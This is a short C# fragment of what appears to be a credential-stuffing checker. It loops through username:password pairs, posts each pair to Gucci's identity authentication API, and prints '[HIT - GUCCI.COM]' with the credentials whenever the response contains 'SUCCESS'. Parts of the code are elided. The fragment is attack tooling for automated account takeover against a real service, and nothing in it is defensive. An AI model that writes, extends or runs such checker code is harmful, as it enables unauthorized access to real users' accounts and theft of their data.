        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str2 = httpRequest.Post("https://identity.gucci.com/api/v1/authn", str1, "application/json").ToString();
              if (!str2.Contains("Authentication failed"))
              {
                if (!str2.Contains("200"))
                {
                  if (str2.Contains("SUCCESS"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - GUCCI.COM] " + s[0] + ":" + s[1], Color.Green);
